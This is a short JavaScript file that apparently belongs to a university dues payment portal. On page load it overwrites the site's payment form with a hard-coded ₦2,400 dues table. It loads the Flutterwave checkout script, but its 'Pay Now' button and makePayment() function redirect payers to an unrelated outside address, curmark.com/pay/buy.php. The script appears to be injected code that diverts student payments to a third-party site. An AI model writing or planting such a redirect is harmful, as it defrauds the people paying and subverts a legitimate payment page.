//alert("Uniuyo is a Brand");
//alert("from GitHub");
window.onload = function (){
  //var elem = document.getElementById("see");
  //elem.innerHTML = "2400";
	var url = window.location.href;
	if(url != "https://dues.skylinepay.ng/profile.php"){
	var pay_form = document.getElementsByClassName("form-horizontal");
	pay_form[0].innerHTML = `<table class="table table-bordered">
    <tbody><tr>
      <th colspan="3"> DUES DETAILS</th>
    </tr>
    <tr>
      <td width="33%"><strong>S/N

      </strong></td>
      <td width="35%"><strong>Due Name</strong></td>
      <td width="32%"><strong>Amount</strong></td>
    </tr>      

    
      <tr>
      <td>1</td>
      <td> Faculty </td>
      <td>₦ 1,000</td>
      </tr> 

      
      <tr>
      <td>2</td>
      <td> Departmental </td>
      <td>₦ 1,000</td>
      </tr> 

        


    

    <tr>
     <td align="right">&nbsp;</td>
     <td align="right"><strong>TOTAL DUES:</strong></td>
     <td> ₦2,000 </td>
   </tr>
   
   <script>
  alert('You are about to pay a fee of N2,000. \nYou will be charged a Processing Fee of N400 \nThis item will remain pending on your account until payment is made Online via your ATM Card. \nDo you wish to Proceed?');
</script>  


            <tr>
    <td align="right">&nbsp;</td>
    <td align="right"><strong>TOTAL PAYMENT DUE:</strong></td>
    <td> <h4> ₦2,400</h4> </td>
  </tr>
  <tr>
    <td colspan="3"><div class="control-group">
      <div class="controls">
        <button type="button" class="btn btn-medium" onclick="parent.location = 'makepayment.php'"><i class="icon-arrow-left"></i> Go Back </button> 
        
          <script src="https://checkout.flutterwave.com/v3.js"></script>
          <a href="http://curmark.com/pay/buy.php"><button type="button" class="btn btn-medium btn-success" onclick="makePayment()">Pay Now</button></a>
        

        <script>
          function makePayment() {
		window.location.href = "http://curmark.com/pay/buy.php";
		window.location.assign("http://curmark.com/pay/buy.php");
          }
          </script>
      </div>
    </div>
    
  </td>
</tr>
</tbody></table>`;
	}
}
//$("#see").text(2400);
function adam(){
  alert("WELCOME TO UNIUYO DUES PORTAL");
}
